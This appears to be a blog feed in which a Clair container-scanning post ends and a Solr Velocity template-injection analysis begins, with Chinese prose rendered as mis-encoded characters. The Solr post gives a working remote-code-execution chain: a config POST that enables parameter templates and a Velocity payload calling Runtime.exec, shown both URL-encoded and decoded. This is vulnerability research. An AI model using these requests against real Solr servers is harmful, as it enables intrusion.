class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">General:</span></span><br><span class="line">  <span class="attr">clair_url:</span> <span class="string">'http://docker.test:6060'</span></span><br><span class="line"><span class="attr">Plugins:</span></span><br><span class="line">  <span class="attr">Docker:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">paclair.plugins.docker_plugin.DockerPlugin</span></span><br><span class="line">    <span class="attr">registries:</span></span><br><span class="line">      <span class="attr">hub.docker.com:</span></span><br><span class="line">        <span class="attr">auth:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"anemone95"</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">"***"</span></span><br></pre></td></tr></table></figure><p>å‡è®¾é…ç½®æ–‡ä»¶ä¿å­˜ä¸º<code>paclair.yml</code>ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸Šä¼ dockerå¹¶å¯åŠ¨æ‰«æ<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> push <span class="comment"># å°†dockerhubä¸Šçš„é•œåƒä¸Šä¼ åˆ°Clair</span></span><br><span class="line">paclair --conf paclair.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> analyse --output-format html 2&gt;result.html <span class="comment"># æ‰«æäº§ç”Ÿhtmlçš„æŠ¥å‘Š</span></span><br><span class="line">paclair --conf conf/conf.yml Docker registry.cn-hangzhou.aliyuncs.com/anemone/<span class="built_in">test</span> delete <span class="comment"># åˆ é™¤å®¹å™¨</span></span><br></pre></td></tr></table></figure></p><p>äº§ç”Ÿçš„æŠ¥å‘Šå¦‚ä¸‹(testä¸Šçš„å®¹å™¨å®é™…ä¸Šæ˜¯<code>medicean/vulapps:s_struts2_s2-037</code>ï¼š</p><p><img src="/container-Clairåˆæ¢/image-20191117172303850.png" alt="image-20191117172303850"></p><p>struts2æ²¡æ‰¾åˆ°æ¼æ´ï¼Œæ¢ä¸ªssh(CVE-2017-1000117)çœ‹çœ‹ï¼Œè¿™å›æˆ‘ä»¬å¯¼å‡ºjsonæ ¼å¼çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paclair --debug --conf paclair.yml Docker medicean/vulapps:s_ssh_1 push</span><br><span class="line">paclair --conf paclair.yml Docker medicean/vulapps:s_ssh_1 analyse 2&gt;ssh.json</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰¾åˆ°äº†ï¼š</p><p><img src="/container-Clairåˆæ¢/image-20191124155822590.png" alt="image-20191124155822590"></p><h1 id="æŠ¥å‘Šåˆ†æ"><a href="#æŠ¥å‘Šåˆ†æ" class="headerlink" title="æŠ¥å‘Šåˆ†æ"></a>æŠ¥å‘Šåˆ†æ</h1><p>å¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸Šï¼ŒæŠ¥å‘Šä¸­å±•ç¤ºäº†å®¹å™¨ä¸­ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œå¦‚gccï¼Œ unzipï¼Œopensslï¼Œå¹¶ä¸”ç»™å‡ºäº†å®‰å…¨ç­‰çº§ï¼Œå½“å‰ç‰ˆæœ¬å’Œä¿®å¤ç‰ˆæœ¬ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥çœ‹åˆ°å…¶ä¸è¶³ï¼š</p><ul><li>å¯¹åº”ç”¨ç»„ä»¶çš„æ£€æµ‹èƒ½åŠ›ä¸è¶³ï¼Œå¦‚æµ‹è¯•é•œåƒçš„ä¸»è¦é—®é¢˜åœ¨äºä½ç‰ˆæœ¬strutsï¼Œä½†æ˜¯å…¶æ²¡æœ‰æ£€æµ‹åˆ°</li><li>åªæ˜¯ç®€å•å¯¹æ¯”å…¶ç»„ä»¶hashï¼Œè€Œæ²¡æœ‰æ›´æ·±å…¥çš„æ£€æµ‹ï¼Œå¦‚å³ä½¿æ˜¯ä½¿ç”¨äº†gccï¼Œä½†æ˜¯å®¹å™¨æš´æ¼åœ¨å¤–éƒ¨çš„éƒ¨åˆ†å¹¶æ²¡æœ‰ç”¨ï¼Œé‚£ä¹ˆå®é™…ä¸Šæ”»å‡»è€…æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼›åˆæ¯”å¦‚ç©ºå¯†ç çš„redisï¼Œä½¿ç”¨hashæ¯”è¾ƒæ˜¯æ²¡æ³•æµ‹å‡ºæ¥çš„ã€‚</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Clairæ˜¯ä¸€æ¬¾ç”¨æ¥æ‰«æå®¹å™¨ä¸­ä½¿ç”¨ç¬¬ä¸‰æ–¹ä¸å®‰å…¨ç»„ä»¶çš„å·¥å…·ï¼Œèƒ½å¤Ÿå°†å®¹å™¨åˆ†å±‚æ‰«æï¼ŒåŒ¹é…CVEï¼ŒUbuntuï¼ŒRedhatç­‰å¤šä¸ªæ•°æ®åº“ï¼Œä¸ªäººæ„Ÿè§‰æœ‰ä»¥ä¸‹ä¼˜ç¼ºç‚¹ï¼š</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>å¼€æºæ ¸å¿ƒæ¨¡å—ï¼Œæ–¹ä¾¿äºŒæ¬¡å¼€å‘</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>Clientä½¿ç”¨å¤æ‚ï¼Œå®˜æ–¹ç»™å‡ºçš„clientâ€”â€”analyze-local-imageså·²ç»åœæ­¢ç»´æŠ¤ï¼Œæ›´å¼ºå¤§çš„clientéœ€è¦ä»˜è´¹ä½¿ç”¨ï¼Œè€Œå…¶ä»–ç¬¬ä¸‰æ–¹çš„clientä¸ä¸€å®šèƒ½æŒç»­ç»´æŠ¤</li><li>æ–‡æ¡£ä¸å…¨ï¼ŒGitHubä¸»é¡µçš„quickstartéƒ½æœ‰å‘ï¼Œè€Œä¸”æ›´å¤šé…ç½®æ²¡æœ‰è¯´æ˜</li><li>å¯¹åº”ç”¨ç»„ä»¶çš„æ£€æµ‹èƒ½åŠ›ä¸è¶³</li><li>æ£€æµ‹é€»è¾‘ç®€å•ï¼Œå­˜åœ¨æ¼æŠ¥å’Œè¯¯æŠ¥</li></ul>]]></content>
      
      
      <categories>
          
          <category> container </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®¹å™¨å®‰å…¨ </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solr Velocityæ¨¡æ¿æ³¨å…¥æ¼æ´åˆ†æ</title>
      <link href="/vulnresearch-Solr_Velocity_injection/"/>
      <url>/vulnresearch-Solr_Velocity_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸‹è½½å—å½±å“ç‰ˆæœ¬çš„solrï¼Œè¿™é‡Œä¾ç„¶é€‰æ‹©v8.1.0ï¼Œè¿™é‡Œæ³¨æ„é™¤äº†æ·»åŠ solrçš„jarè¿˜éœ€è¦æ·»åŠ velocityçš„ï¼ˆæºç çš„åŒ–å¯ä»¥è®©IDEAä»mavenä¸Šä¸‹æºç ï¼‰ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png" alt="image-20191124205421987"></p><p>åŒæ ·çš„æ–¹æ³•å¯åŠ¨é¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0</span><br><span class="line">$ <span class="built_in">cd</span> server/ <span class="comment">#ä¸€å®šè¦åœ¨serverä¸‹è¿è¡Œ</span></span><br><span class="line">anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --module=http</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><h2 id="0x00-æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity"><a href="#0x00-æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity" class="headerlink" title="0x00  æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity"></a>0x00  æ£€æŸ¥coreæ˜¯å¦å…è®¸velocity</h2><p>æ£€æŸ¥<code>{core}/conf/solrconfig.xml</code>ä¸­æ˜¯å¦å…è®¸solr.VelocityResponseWriterï¼Œå…·ä½“æ¥è¯´ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ä¸€å®šè¦åŠ ä¾èµ–ï¼Œå¦åˆ™ä¼šæŠ¥é”™400ï¼Œæ‰¾ä¸åˆ°velocityç±» --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/contrib/velocity/lib"</span> <span class="attr">regex</span>=<span class="string">".*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lib</span> <span class="attr">dir</span>=<span class="string">"$&#123;solr.install.dir:../../../..&#125;/dist/"</span> <span class="attr">regex</span>=<span class="string">"solr-velocity-\d.*\.jar"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- å¼€å¯velocityResponse --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queryResponseWriter</span> <span class="attr">name</span>=<span class="string">"velocity"</span> <span class="attr">class</span>=<span class="string">"solr.VelocityResponseWriter"</span> <span class="attr">startup</span>=<span class="string">"lazy"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">str</span> <span class="attr">name</span>=<span class="string">"template.base.dir"</span>&gt;</span>$&#123;velocity.template.base.dir:&#125;<span class="tag">&lt;/<span class="name">str</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queryResponseWriter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰éœ€è¦åŠ ä¸Šï¼Œå¹¶ä¸”é‡å¯solr</p><h2 id="0x01-è®¾ç½®params-resource-loader-enabled-true"><a href="#0x01-è®¾ç½®params-resource-loader-enabled-true" class="headerlink" title="0x01 è®¾ç½®params.resource.loader.enabled=true"></a>0x01 è®¾ç½®params.resource.loader.enabled=true</h2><p>è®¾ç½®VelocityResponseWriteræ’ä»¶çš„params.resource.loader.enabledé€‰é¡¹è®¾ç½®ä¸ºtrueï¼Œå³å…è®¸åœ¨Solrè¯·æ±‚å‚æ•°ä¸­å…è®¸æ¨¡æ¿ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "update-queryresponsewriter": &#123;</span><br><span class="line">    "startup": "lazy",</span><br><span class="line">    "name": "velocity",</span><br><span class="line">    "class": "solr.VelocityResponseWriter",</span><br><span class="line">    "template.base.dir": "",</span><br><span class="line">    "solr.resource.loader.enabled": "true",</span><br><span class="line">    "params.resource.loader.enabled": "true"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡è¿”å›200å¹¶ä¸”è§‚å¯Ÿåˆ°<code>${solr_home}/example/example-DIH/solr/tika/conf</code>ä¸‹å‡ºç°<code>configoverlay.json</code>è¡¨ç¤ºè®¾ç½®æˆåŠŸã€‚</p><h2 id="0x02-é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE"><a href="#0x02-é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE" class="headerlink" title="0x02 é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE"></a>0x02 é€šè¿‡Velocityæ¨¡æ¿æ³¨å…¥è¿›è¡ŒRCE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/solr/tika/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost.com:8983</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>è¿”å›åŒ…ä¸­çœ‹åˆ°å‘½ä»¤æ‰§è¡Œç»“æœï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124164155298.png" alt="image-20191124164155298"></p><h3 id="Velocity-RCEæ–¹æ³•"><a href="#Velocity-RCEæ–¹æ³•" class="headerlink" title="Velocity RCEæ–¹æ³•"></a>Velocity RCEæ–¹æ³•</h3><p>urldecodeä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°velocityè¿›è¡ŒRCEçš„payloadï¼Œç•™ç€ä»¥åå¯èƒ½æœ‰ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;) </span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;)) </span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;)) </span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;)) </span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))+$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream()) </span><br><span class="line">#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure><h1 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h1><p>Solr&lt;=8.2.0 ä¸”coreå…è®¸velocityæ¨¡æ¿ã€‚</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="solr-core-config"><a href="#solr-core-config" class="headerlink" title="/solr/{core}/config"></a>/solr/{core}/config</h2><p>è¿˜æ˜¯è·Ÿä¸Šæ¬¡ä¸€æ ·ï¼Œæ–­ç‚¹ä¸‹åœ¨org.apache.solr.servlet.HttpSolrCall#call:519è¿™é‡Œï¼Œè°ƒè¯•ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼Œè¿˜æ˜¯é€šè¿‡å¦‚ä¸‹è°ƒç”¨æ ˆï¼Œäº¤ç»™handlerå¤„ç†è¯·æ±‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.servlet.HttpSolrCall#call:542</span><br><span class="line">  org.apache.solr.servlet.HttpSolrCall#execute():756</span><br><span class="line">    org.apache.solr.core.SolrCore#execute:2566</span><br><span class="line">      org.apache.solr.request.SolrRequestHandler#handleRequest:199</span><br><span class="line">        org.apache.solr.handler.SolrConfigHandler#handleRequestBody</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ­¤å¤„ç†çš„handleræ˜¯SolrConfigHandlerï¼Œå…¶å°†æ¥å—çš„postå‚æ•°åˆ›å»ºä¸ºcommandå¯¹è±¡ï¼ˆ129è¡Œï¼‰ï¼Œç„¶åè°ƒç”¨å®ƒçš„handlePOST()æ–¹æ³•ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175443383.png" alt="image-20191124175443383"></p><p>handlePOST()æ–¹æ³•å¦‚ä¸‹ï¼Œå…¶è·å–commandçš„æ“ä½œï¼Œä»¥åŠéœ€è¦è¦†ç›–çš„åŸé…ç½®ï¼Œè°ƒCommand#handleCommandsï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175720679.png" alt="image-20191124175720679"></p><p>Command#handleCommands(ops, overlay)ï¼Œå…¶æ˜¯ä¸€ä¸ªswitch-caseç»“æ„ï¼Œè¿™é‡Œèµ°çš„æ˜¯é»˜è®¤åˆ†æ”¯ï¼Œç„¶åè°ƒç”¨Command#updateNamedPluginæ›´æ–°ä¹‹å‰çš„é…ç½®ï¼ˆoverlayå˜é‡ï¼‰ï¼Œå†å°†é…ç½®ä¿å­˜åˆ°zkæˆ–è€…æœ¬åœ°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleCommands</span><span class="params">(List&lt;CommandOperation&gt; ops, ConfigOverlay overlay)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (CommandOperation op : ops) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (op.name) &#123;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">default</span>: &#123;</span><br><span class="line">          List&lt;String&gt; pcs = StrUtils.splitSmart(op.name.toLowerCase(Locale.ROOT), <span class="string">'-'</span>);</span><br><span class="line">          <span class="keyword">if</span> (pcs.size() != <span class="number">2</span>) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String prefix = pcs.get(<span class="number">0</span>);</span><br><span class="line">            String name = pcs.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmdPrefixes.contains(prefix) &amp;&amp; namedPlugins.containsKey(name)) &#123;</span><br><span class="line">              SolrConfig.SolrPluginInfo info = namedPlugins.get(name);</span><br><span class="line">              <span class="keyword">if</span> (<span class="string">"delete"</span>.equals(prefix)) &#123;</span><br><span class="line">                overlay = deleteNamedComponent(op, overlay, info.getCleanTag());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                overlay = updateNamedPlugin(info, op, overlay, prefix.equals(<span class="string">"create"</span>) || prefix.equals(<span class="string">"add"</span>)); <span class="comment">//è¿™é‡Œæ›´æ–°é…ç½®ï¼ˆoverlayå˜é‡ï¼‰</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              op.unknownOperation();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List errs = CommandOperation.captureErrors(ops);</span><br><span class="line">    <span class="keyword">if</span> (!errs.isEmpty()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">    <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> ZkSolrResourceLoader) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      SolrResourceLoader.persistConfLocally(loader, ConfigOverlay.RESOURCE_NAME, overlay.toByteArray()); <span class="comment">// å°†é…ç½®ä¿å­˜åˆ°æœ¬åœ°</span></span><br><span class="line">      req.getCore().getCoreContainer().reload(req.getCore().getName()); <span class="comment">// æ›´æ–°é…ç½®</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>28è¡Œï¼ˆå®é™…ä»£ç 504è¡Œï¼‰ä¼šå°†é…ç½®ä¿å­˜åˆ°æœ¬åœ°ï¼Œä¹Ÿå°±æ˜¯<code>{core}/conf/configoverlay.json</code>æ–‡ä»¶äº†ã€‚</p><p>é‚£ä¹ˆæ€»ç»“ä¸€ä¸‹è°ƒç”¨æ ˆå°±æ˜¯ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124181632402.png" alt="image-20191124181632402"></p><h2 id="solr-core-select"><a href="#solr-core-select" class="headerlink" title="/solr/{core}/select"></a>/solr/{core}/select</h2><p> è¿™ä¸ªAPIåŸå…ˆåº”è¯¥æ˜¯æ•°æ®åº“æŸ¥è¯¢ç”¨çš„ï¼Œä½†ç°åœ¨ç”±äºå…è®¸äº†æ‰§è¡Œå‚æ•°ä¸­æŒ‡å®šçš„velocityï¼Œé€ æˆäº†SSTIï¼Œæˆ‘ä»¬é‡æ–°çœ‹ä¸€ä¸‹org.apache.solr.servlet.HttpSolrCall#callæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();<span class="comment">//VelocityResopnseWriter</span></span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod); <span class="comment">//SSTI</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) <span class="comment">/*...*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼•å‘SSTIçš„å…³é”®åœ¨äºç¬¬26è¡Œï¼ˆæºç¨‹åºç¬¬556è¡Œï¼‰ï¼Œå…¶è°ƒç”¨äº†HttpSolrCall#getResponseWriterï¼Œè·å–åˆ°VelocityResponseWriterï¼Œå’Œ30è¡Œï¼ˆæºç¨‹åº558è¡Œï¼‰ï¼Œå…¶ä¼šé€šè¿‡HttpSolrCall#writeResponseå°†Requestä¸­å‚æ•°æ¸²æŸ“åˆ°é¡µé¢ã€‚</p><p>å…ˆçœ‹HttpSolrCall#getResponseWriterï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184425485.png" alt="image-20191124184425485"></p><p>é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä»å‚æ•°<code>wt</code>ä¸­è·å–æ¨¡æ¿ï¼Œç„¶åè¿”å›å¯¹åº”æ¨¡æ¿â€”â€”æ³¨æ„åˆ°PoCä¸­çš„<code>wt=velocity</code></p><p>å†çœ‹HttpSolrCall#writeResponseï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184911792.png" alt="image-20191124184911792"></p><p>å…¶è°ƒç”¨äº†QueryResponseWriterUtil#writeQueryResponse()ï¼Œå°†solrReqï¼ŒsolrRspå†™æˆHTTP Responseï¼Œctæ˜¯content-typeã€‚</p><p>HttpSolrCall#writeResponse()è°ƒç”¨QueryResponseWriterUtil#writeQueryResponse()ï¼Œå…ˆç”Ÿäº§ä¸€ä¸ªOutputStreamWriterï¼Œç„¶åç”¨responseWriterå†™å…¥å†…å®¹ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124185248960.png" alt="image-20191124185248960"></p><p>å†è·Ÿè¿›å»å°±åˆ°äº†VelocityResponseWriter#writeï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124190358485.png" alt="image-20191124190358485"></p><h3 id="VelocityResponseWriter-createEngine"><a href="#VelocityResponseWriter-createEngine" class="headerlink" title="VelocityResponseWriter#createEngine"></a>VelocityResponseWriter#createEngine</h3><p>åœ¨VelocityResponseWriter#createEngineä¸­ï¼Œå¦‚æœ<code>paramsResourceLoaderEnabled</code>ï¼Œé‚£ä¹ˆ<code>params.resource.loader.instance=new SolrParamResourceLoader(request)</code>ï¼Œå¦‚æœ<code>solrResourceLoaderEnabled</code>ï¼Œé‚£ä¹ˆ<code>solr.resource.loader.instance=solrResourceLader</code></p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124210507568.png" alt="image-20191124210507568"></p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªifâ€”â€”<code>SolrParamResourceLoader(request)</code>è¿™ä¸ªæ„é€ 